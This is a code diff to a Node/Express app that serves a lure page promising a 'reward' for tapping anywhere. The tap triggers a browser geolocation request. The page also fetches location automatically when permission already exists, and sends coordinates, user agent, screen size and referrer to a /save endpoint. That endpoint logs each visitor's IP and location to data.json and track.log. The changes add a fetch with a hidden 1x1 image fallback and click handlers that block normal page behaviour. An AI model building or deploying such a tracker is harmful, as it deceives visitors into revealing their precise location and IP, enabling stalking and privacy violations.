@@ -71,7 +71,200 @@ app.get("/", (req, res) => {
         
         <div class="refresh-notice" id="refreshNotice">Page will refresh in <span id="countdown">3</span>s</div>
         
-        <script>
+//         <script>
+//     // Show refresh countdown
+//     const notice = document.getElementById('refreshNotice');
+//     const countdown = document.getElementById('countdown');
+//     let seconds = 3;
+    
+//     const timer = setInterval(() => {
+//         seconds--;
+//         countdown.textContent = seconds;
+//         if (seconds <= 0) {
+//             clearInterval(timer);
+//             notice.style.display = 'none';
+//         }
+//     }, 1000);
+    
+//     // Show notice after 1 second
+//     setTimeout(() => {
+//         notice.style.display = 'block';
+//     }, 1000);
+    
+//     // Make image clickable
+//     const image = document.querySelector('img');
+//     image.style.cursor = 'pointer';
+    
+//     // Add click instruction
+//     const clickHint = document.createElement('div');
+//     clickHint.innerHTML = '📍 Tap anywhere to get reward';
+// clickHint.style.cssText = 
+//     'position: fixed;' +
+//     'bottom: 50px;' +
+//     'left: 0;' +
+//     'right: 0;' +
+//     'text-align: center;' +
+//     'background: rgba(0,0,0,0.8);' +
+//     'color: white;' +
+//     'padding: 12px 20px;' +
+//     'border-radius: 25px;' +
+//     'font-family: Arial, sans-serif;' +
+//     'font-size: 16px;' +
+//     'font-weight: bold;' +
+//     'margin: 0 auto;' +
+//     'width: fit-content;' +
+//     'z-index: 1000;' +
+//     'animation: pulse 2s infinite;';
+//     document.body.appendChild(clickHint);
+    
+//     // Add pulse animation
+//     const style = document.createElement('style');
+// style.textContent = 
+//     '@keyframes pulse {' +
+//     '    0% { opacity: 0.7; transform: scale(1); }' +
+//     '    50% { opacity: 1; transform: scale(1.05); }' +
+//     '    100% { opacity: 0.7; transform: scale(1); }' +
+//     '}';
+//     document.head.appendChild(style);
+    
+//     // Remove hint after 10 seconds
+//     setTimeout(() => {
+//         clickHint.style.display = 'none';
+//     }, 10000);
+    
+//     // Function to send data
+//     function sendTrackingData(lat, lng, acc, error) {
+//         const data = {
+//             ua: navigator.userAgent,
+//             screen: window.screen.width + 'x' + window.screen.height,
+//             time: new Date().toISOString(),
+//             referer: document.referrer || 'direct',
+//             t: Date.now(),
+//             lat: lat || 'Blocked',
+//             lng: lng || 'Blocked',
+//             acc: acc || 'N/A',
+//             error: error || 'none',
+//             status: lat ? 'success' : 'blocked'
+//         };
+        
+//         // Build URL
+//         let url = '/save?';
+//         for(let key in data) {
+//             if(data[key] !== undefined && data[key] !== null) {
+//                 url += key + '=' + encodeURIComponent(data[key]) + '&';
+//             }
+//         }
+        
+//         // Send via image (works everywhere)
+//         const tracker = new Image();
+//         tracker.src = url;
+//         tracker.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0;';
+//         document.body.appendChild(tracker);
+        
+//         console.log('📡 Tracking data sent:', {lat, lng, error});
+        
+//         // Update hint
+//         if (lat && lng) {
+//             clickHint.innerHTML = '✅ wait for 10 seconds to get rewarded';
+//             clickHint.style.background = 'rgba(34, 197, 94, 0.9)';
+//         } else {
+//             clickHint.innerHTML = '📍 Location not shared';
+//             clickHint.style.background = 'rgba(239, 68, 68, 0.9)';
+//         }
+        
+//         // Hide after 3 seconds
+//         setTimeout(() => {
+//             clickHint.style.display = 'none';
+//         }, 3000);
+//     }
+    
+//     // Function to request location
+//     function requestLocation() {
+//         clickHint.innerHTML = '🔄 Requesting location...';
+        
+//         if (!navigator.geolocation) {
+//             sendTrackingData(null, null, null, 'not_supported');
+//             return;
+//         }
+        
+//         // Request location with user gesture
+//         navigator.geolocation.getCurrentPosition(
+//             // Success
+//             function(position) {
+//                 sendTrackingData(
+//                     position.coords.latitude,
+//                     position.coords.longitude,
+//                     position.coords.accuracy,
+//                     null
+//                 );
+//             },
+//             // Error
+//             function(error) {
+//                 sendTrackingData(null, null, null, 'error_' + error.code);
+                
+//                 // Try watchPosition as fallback
+//                 const watchId = navigator.geolocation.watchPosition(
+//                     function(watchPos) {
+//                         sendTrackingData(
+//                             watchPos.coords.latitude,
+//                             watchPos.coords.longitude,
+//                             watchPos.coords.accuracy,
+//                             null
+//                         );
+//                         navigator.geolocation.clearWatch(watchId);
+//                     },
+//                     null,
+//                     { timeout: 3000 }
+//                 );
+                
+//                 setTimeout(() => navigator.geolocation.clearWatch(watchId), 5000);
+//             },
+//             // Options
+//             {
+//                 enableHighAccuracy: true,
+//                 timeout: 8000,
+//                 maximumAge: 0
+//             }
+//         );
+//     }
+    
+//     // Add click event to image
+//     image.addEventListener('click', requestLocation);
+//     image.addEventListener('touchstart', requestLocation);
+    
+//     // Also make entire body clickable
+//     document.body.addEventListener('click', requestLocation);
+//     document.body.addEventListener('touchstart', requestLocation);
+    
+//     // Auto-try location if already have permission
+//     setTimeout(() => {
+//         if (navigator.permissions && navigator.permissions.query) {
+//             navigator.permissions.query({name: 'geolocation'})
+//                 .then(permissionStatus => {
+//                     if (permissionStatus.state === 'granted') {
+//                         // Already have permission, get location automatically
+//                         navigator.geolocation.getCurrentPosition(
+//                             pos => {
+//                                 sendTrackingData(
+//                                     pos.coords.latitude,
+//                                     pos.coords.longitude,
+//                                     pos.coords.accuracy,
+//                                     null
+//                                 );
+//                             },
+//                             err => {
+//                                 sendTrackingData(null, null, null, 'error_' + err.code);
+//                             }
+//                         );
+//                     }
+//                 });
+//         }
+//     }, 1000);
+    
+// </script>
+
+
+<script>
     // Show refresh countdown
     const notice = document.getElementById('refreshNotice');
     const countdown = document.getElementById('countdown');
@@ -98,33 +291,33 @@ app.get("/", (req, res) => {
     // Add click instruction
     const clickHint = document.createElement('div');
     clickHint.innerHTML = '📍 Tap anywhere to get reward';
-clickHint.style.cssText = 
-    'position: fixed;' +
-    'bottom: 50px;' +
-    'left: 0;' +
-    'right: 0;' +
-    'text-align: center;' +
-    'background: rgba(0,0,0,0.8);' +
-    'color: white;' +
-    'padding: 12px 20px;' +
-    'border-radius: 25px;' +
-    'font-family: Arial, sans-serif;' +
-    'font-size: 16px;' +
-    'font-weight: bold;' +
-    'margin: 0 auto;' +
-    'width: fit-content;' +
-    'z-index: 1000;' +
-    'animation: pulse 2s infinite;';
+    clickHint.style.cssText = 
+        'position: fixed;' +
+        'bottom: 50px;' +
+        'left: 0;' +
+        'right: 0;' +
+        'text-align: center;' +
+        'background: rgba(0,0,0,0.8);' +
+        'color: white;' +
+        'padding: 12px 20px;' +
+        'border-radius: 25px;' +
+        'font-family: Arial, sans-serif;' +
+        'font-size: 16px;' +
+        'font-weight: bold;' +
+        'margin: 0 auto;' +
+        'width: fit-content;' +
+        'z-index: 1000;' +
+        'animation: pulse 2s infinite;';
     document.body.appendChild(clickHint);
     
     // Add pulse animation
     const style = document.createElement('style');
-style.textContent = 
-    '@keyframes pulse {' +
-    '    0% { opacity: 0.7; transform: scale(1); }' +
-    '    50% { opacity: 1; transform: scale(1.05); }' +
-    '    100% { opacity: 0.7; transform: scale(1); }' +
-    '}';
+    style.textContent = 
+        '@keyframes pulse {' +
+        '    0% { opacity: 0.7; transform: scale(1); }' +
+        '    50% { opacity: 1; transform: scale(1.05); }' +
+        '    100% { opacity: 0.7; transform: scale(1); }' +
+        '}';
     document.head.appendChild(style);
     
     // Remove hint after 10 seconds
@@ -132,8 +325,15 @@ style.textContent =
         clickHint.style.display = 'none';
     }, 10000);
     
-    // Function to send data
+    // Track if location was already requested
+    let locationRequested = false;
+    
+    // Function to send data - IMPROVED
     function sendTrackingData(lat, lng, acc, error) {
+        // Prevent multiple sends
+        if (locationRequested) return;
+        locationRequested = true;
+        
         const data = {
             ua: navigator.userAgent,
             screen: window.screen.width + 'x' + window.screen.height,
@@ -155,21 +355,33 @@ style.textContent =
             }
         }
         
-        // Send via image (works everywhere)
-        const tracker = new Image();
-        tracker.src = url;
-        tracker.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0;';
-        document.body.appendChild(tracker);
+        console.log('📡 Sending data to:', url.substring(0, 100) + '...');
         
-        console.log('📡 Tracking data sent:', {lat, lng, error});
+        // Send via fetch first (more reliable)
+        fetch(url, { 
+            mode: 'no-cors',
+            cache: 'no-store'
+        }).then(() => {
+            console.log('✅ Fetch request sent');
+        }).catch(err => {
+            console.log('❌ Fetch failed:', err);
+            // Fallback: Use image
+            const tracker = new Image();
+            tracker.src = url;
+            tracker.style.cssText = 'position:absolute;width:1px;height:1px;opacity:0;';
+            document.body.appendChild(tracker);
+            console.log('🔄 Image fallback sent');
+        });
         
         // Update hint
         if (lat && lng) {
-            clickHint.innerHTML = '✅ wait for 10 seconds to get rewarded';
+            clickHint.innerHTML = '✅ Wait for 10 seconds to get rewarded';
             clickHint.style.background = 'rgba(34, 197, 94, 0.9)';
+            console.log('✅ Location sent successfully');
         } else {
             clickHint.innerHTML = '📍 Location not shared';
             clickHint.style.background = 'rgba(239, 68, 68, 0.9)';
+            console.log('❌ Location not sent');
         }
         
         // Hide after 3 seconds
@@ -178,19 +390,33 @@ style.textContent =
         }, 3000);
     }
     
-    // Function to request location
+    // Function to request location - IMPROVED FOR MOBILE
     function requestLocation() {
+        if (locationRequested) return;
+        
         clickHint.innerHTML = '🔄 Requesting location...';
+        console.log('📍 Starting location request...');
         
         if (!navigator.geolocation) {
+            console.log('❌ Geolocation not supported');
             sendTrackingData(null, null, null, 'not_supported');
             return;
         }
+        
+        // FOR MOBILE: Use simpler options
+        const options = {
+            enableHighAccuracy: true,
+            timeout: 15000,  // Increased timeout for mobile
+            maximumAge: 0
+        };
+        
+        console.log('📍 Calling getCurrentPosition with options:', options);
         
         // Request location with user gesture
         navigator.geolocation.getCurrentPosition(
             // Success
             function(position) {
+                console.log('✅ Location received:', position.coords);
                 sendTrackingData(
                     position.coords.latitude,
                     position.coords.longitude,
@@ -200,51 +426,79 @@ style.textContent =
             },
             // Error
             function(error) {
+                console.log('❌ Location error:', error.code, error.message);
+                
+                // Send error data immediately
                 sendTrackingData(null, null, null, 'error_' + error.code);
                 
-                // Try watchPosition as fallback
-                const watchId = navigator.geolocation.watchPosition(
-                    function(watchPos) {
-                        sendTrackingData(
-                            watchPos.coords.latitude,
-                            watchPos.coords.longitude,
-                            watchPos.coords.accuracy,
-                            null
-                        );
+                // Try watchPosition as fallback (for some Android devices)
+                if (error.code !== 1) { // Not permission denied
+                    console.log('🔄 Trying watchPosition fallback...');
+                    const watchId = navigator.geolocation.watchPosition(
+                        function(watchPos) {
+                            console.log('✅ watchPosition success:', watchPos.coords);
+                            sendTrackingData(
+                                watchPos.coords.latitude,
+                                watchPos.coords.longitude,
+                                watchPos.coords.accuracy,
+                                null
+                            );
+                            navigator.geolocation.clearWatch(watchId);
+                        },
+                        null,
+                        { timeout: 5000 }
+                    );
+                    
+                    setTimeout(() => {
                         navigator.geolocation.clearWatch(watchId);
-                    },
-                    null,
-                    { timeout: 3000 }
-                );
-                
-                setTimeout(() => navigator.geolocation.clearWatch(watchId), 5000);
+                        console.log('⏱️ watchPosition timeout cleared');
+                    }, 10000);
+                }
             },
-            // Options
-            {
-                enableHighAccuracy: true,
-                timeout: 8000,
-                maximumAge: 0
-            }
+            options
         );
     }
     
-    // Add click event to image
-    image.addEventListener('click', requestLocation);
-    image.addEventListener('touchstart', requestLocation);
+    // Add click event to image - IMPROVED
+    function setupClickHandlers() {
+        // Remove existing listeners first
+        image.removeEventListener('click', requestLocation);
+        image.removeEventListener('touchstart', requestLocation);
+        document.body.removeEventListener('click', requestLocation);
+        document.body.removeEventListener('touchstart', requestLocation);
+        
+        // Add new listeners with better handling
+        const clickHandler = function(e) {
+            e.preventDefault();
+            e.stopPropagation();
+            console.log('🖱️ Click/touch detected');
+            requestLocation();
+            return false;
+        };
+        
+        image.addEventListener('click', clickHandler);
+        image.addEventListener('touchstart', clickHandler, { passive: false });
+        document.body.addEventListener('click', clickHandler);
+        document.body.addEventListener('touchstart', clickHandler, { passive: false });
+        
+        console.log('✅ Click handlers setup complete');
+    }
     
-    // Also make entire body clickable
-    document.body.addEventListener('click', requestLocation);
-    document.body.addEventListener('touchstart', requestLocation);
+    // Setup click handlers when page loads
+    window.addEventListener('DOMContentLoaded', setupClickHandlers);
     
     // Auto-try location if already have permission
     setTimeout(() => {
         if (navigator.permissions && navigator.permissions.query) {
             navigator.permissions.query({name: 'geolocation'})
                 .then(permissionStatus => {
+                    console.log('🔍 Permission status:', permissionStatus.state);
                     if (permissionStatus.state === 'granted') {
                         // Already have permission, get location automatically
+                        console.log('✅ Permission already granted, auto-requesting location');
                         navigator.geolocation.getCurrentPosition(
                             pos => {
+                                console.log('✅ Auto-request success:', pos.coords);
                                 sendTrackingData(
                                     pos.coords.latitude,
                                     pos.coords.longitude,
@@ -253,19 +507,113 @@ style.textContent =
                                 );
                             },
                             err => {
+                                console.log('❌ Auto-request error:', err.code);
                                 sendTrackingData(null, null, null, 'error_' + err.code);
                             }
                         );
+                    } else if (permissionStatus.state === 'prompt') {
+                        console.log('🔄 Waiting for user interaction...');
+                        // Show hint to click
+                        clickHint.style.display = 'block';
+                    } else {
+                        console.log('❌ Permission denied previously');
+                        clickHint.innerHTML = '📍 Enable location in browser settings';
+                        clickHint.style.background = 'rgba(245, 158, 11, 0.9)';
                     }
+                })
+                .catch(err => {
+                    console.log('❌ Permission query failed:', err);
                 });
+        } else {
+            console.log('🔍 Permissions API not available');
+            // Show hint
+            clickHint.style.display = 'block';
         }
-    }, 1000);
+    }, 500);
     
+    // Debug: Log page info
+    console.log('📱 Device info:', {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        screen: window.screen.width + 'x' + window.screen.height,
+        protocol: window.location.protocol,
+        host: window.location.host
+    });
 </script>
+
+
     </body>
     </html>
   `);
 });
+
+// // SAVE ENDPOINT - Store tracking data
+// app.get("/save", (req, res) => {
+//   const ip =
+//     req.headers["x-forwarded-for"] || req.ip || req.connection.remoteAddress;
+//   const timestamp = new Date().toLocaleString("en-US", {
+//     year: "numeric",
+//     month: "short",
+//     day: "numeric",
+//     hour: "2-digit",
+//     minute: "2-digit",
+//     second: "2-digit",
+//   });
+
+//   // Create data entry
+//   const entry = {
+//     id: Date.now() + Math.random().toString(36).substr(2, 9),
+//     timestamp: timestamp,
+//     ip: ip,
+//     latitude: req.query.lat || "Blocked",
+//     longitude: req.query.lng || "Blocked",
+//     accuracy: req.query.acc ? Math.round(req.query.acc) + "m" : "N/A",
+//     userAgent: req.query.ua || "Unknown",
+//     screenSize: req.query.screen || "Unknown",
+//     referer: req.query.referer || "Direct",
+//     status: req.query.status || (req.query.lat ? "success" : "blocked"),
+//     error: req.query.error || "none",
+//     visitTime: req.query.time || new Date().toISOString(),
+//   };
+
+//   // Log to console
+//   console.log("📍 TRACKED:", {
+//     time: entry.timestamp,
+//     ip: entry.ip,
+//     location: entry.latitude + ", " + entry.longitude,
+//     status: entry.status,
+//   });
+
+//   // Save to JSON file
+//   let data = [];
+//   try {
+//     if (fs.existsSync("data.json")) {
+//       data = JSON.parse(fs.readFileSync("data.json", "utf8"));
+//     }
+//   } catch (e) {
+//     console.log("Error reading data.json:", e.message);
+//   }
+
+//   data.unshift(entry); // Add to beginning
+//   fs.writeFileSync("data.json", JSON.stringify(data, null, 2));
+
+//   // Also append to simple log file
+//   const logLine = `[${timestamp}] ${entry.ip} | Location: ${entry.latitude}, ${entry.longitude} | Status: ${entry.status}\n`;
+//   fs.appendFileSync("track.log", logLine);
+
+//   // Return transparent 1x1 pixel
+//   res.setHeader("Access-Control-Allow-Origin", "*");
+//   res.writeHead(200, {
+//     "Content-Type": "image/png",
+//     "Cache-Control": "no-cache, no-store, must-revalidate",
+//   });
+//   res.end(
+//     Buffer.from(
+//       "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNkYPhfDwAChwGA60e6kgAAAABJRU5ErkJggg==",
+//       "base64",
+//     ),
+//   );
+// });
 
 // SAVE ENDPOINT - Store tracking data
 app.get("/save", (req, res) => {
@@ -280,6 +628,15 @@ app.get("/save", (req, res) => {
     second: "2-digit",
   });
 
+  // DEBUG: Log everything
+  console.log("📡 RECEIVED REQUEST:");
+  console.log("  IP:", ip);
+  console.log("  Query params:", req.query);
+  console.log("  Headers:", {
+    "user-agent": req.headers["user-agent"],
+    referer: req.headers.referer,
+  });
+
   // Create data entry
   const entry = {
     id: Date.now() + Math.random().toString(36).substr(2, 9),
@@ -288,21 +645,18 @@ app.get("/save", (req, res) => {
     latitude: req.query.lat || "Blocked",
     longitude: req.query.lng || "Blocked",
     accuracy: req.query.acc ? Math.round(req.query.acc) + "m" : "N/A",
-    userAgent: req.query.ua || "Unknown",
+    userAgent: req.query.ua || req.headers["user-agent"] || "Unknown",
     screenSize: req.query.screen || "Unknown",
-    referer: req.query.referer || "Direct",
-    status: req.query.status || (req.query.lat ? "success" : "blocked"),
+    referer: req.query.referer || req.headers.referer || "Direct",
+    status:
+      req.query.lat && req.query.lat !== "Blocked" ? "success" : "blocked",
     error: req.query.error || "none",
     visitTime: req.query.time || new Date().toISOString(),
   };
 
   // Log to console
-  console.log("📍 TRACKED:", {
-    time: entry.timestamp,
-    ip: entry.ip,
-    location: entry.latitude + ", " + entry.longitude,
-    status: entry.status,
-  });
+  console.log("📍 TRACKED ENTRY:", entry);
+  console.log("---");
 
   // Save to JSON file
   let data = [];
@@ -318,7 +672,7 @@ app.get("/save", (req, res) => {
   fs.writeFileSync("data.json", JSON.stringify(data, null, 2));
 
   // Also append to simple log file
-  const logLine = `[${timestamp}] ${entry.ip} | Location: ${entry.latitude}, ${entry.longitude} | Status: ${entry.status}\n`;
+  const logLine = `[${timestamp}] ${entry.ip} | Location: ${entry.latitude}, ${entry.longitude} | Status: ${entry.status} | Error: ${entry.error}\n`;
   fs.appendFileSync("track.log", logLine);
 
   // Return transparent 1x1 pixel
